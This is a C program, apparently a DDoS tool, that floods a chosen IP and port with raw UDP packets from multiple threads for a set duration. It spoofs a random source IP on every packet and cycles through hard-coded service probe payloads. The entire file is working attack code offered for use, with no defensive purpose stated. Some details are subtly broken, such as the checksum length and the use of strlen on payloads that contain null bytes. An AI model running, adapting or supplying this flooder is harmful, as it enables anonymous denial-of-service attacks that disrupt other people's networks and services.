#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

// Pseudo-header needed for UDP checksum calculation
struct pseudo_header {
    unsigned int src_addr;
    unsigned int dst_addr;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short udp_length;
};

// Function to calculate checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void usage() {
    printf("Usage: ./rawsocket_attack ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

// Example payloads similar to the original program
char *payloads[] = {
    "\xd9\x00",
    "\x00\x00",
    "\xd9\x00\x00",
    "\x72\xfe\x1d\x13\x00\x00",
    "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
    "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
    "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00"
};

// Function to generate a random IP address
unsigned int random_ip() {
    return (rand() % 256) << 24 | (rand() % 256) << 16 | (rand() % 256) << 8 | (rand() % 256);
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // Create raw socket
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Set up destination address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    char packet[4096];  // Buffer to hold the entire packet (IP + UDP + payload)
    memset(packet, 0, 4096);

    struct iphdr *ip_header = (struct iphdr *)packet;
    struct udphdr *udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));

    endtime = time(NULL) + data->time;

    // Continuously send packets until time is up
    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            memset(packet, 0, 4096); // Clear packet buffer before each payload

            // Refill headers (since they will change with the payload)
            ip_header = (struct iphdr *)packet;
            udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));

            // Refill the IP header
            ip_header->ihl = 5;  // Header length
            ip_header->version = 4;  // IPv4
            ip_header->tos = 0;
            ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(payloads[i]));
            ip_header->id = htonl(54321);  // ID of the packet
            ip_header->frag_off = 0;
            ip_header->ttl = 64;  // Time to live
            ip_header->protocol = IPPROTO_UDP;  // Protocol

            // Randomize the source IP
            ip_header->saddr = htonl(random_ip());  // Random source IP
            ip_header->daddr = server_addr.sin_addr.s_addr;

            // Fill UDP header
            udp_header->source = htons(12345);  // Spoofed source port
            udp_header->dest = htons(data->port);  // Destination port
            udp_header->len = htons(sizeof(struct udphdr) + strlen(payloads[i]));  // UDP length

            // Copy the payload
            memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), payloads[i], strlen(payloads[i]));

            // Calculate the IP checksum
            ip_header->check = checksum((unsigned short *)packet, ip_header->tot_len);

            // Pseudo header for UDP checksum
            struct pseudo_header psh;
            psh.src_addr = ip_header->saddr;
            psh.dst_addr = ip_header->daddr;
            psh.placeholder = 0;
            psh.protocol = IPPROTO_UDP;
            psh.udp_length = udp_header->len;

            // Calculate UDP checksum
            char pseudogram[4096];
            memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
            memcpy(pseudogram + sizeof(struct pseudo_header), udp_header, sizeof(struct udphdr) + strlen(payloads[i]));
            udp_header->check = checksum((unsigned short *)pseudogram, sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(payloads[i]));

            // Send the packet
            if (sendto(sock, packet, ntohs(ip_header->tot_len), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    srand(time(NULL));  // Seed the random number generator

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}
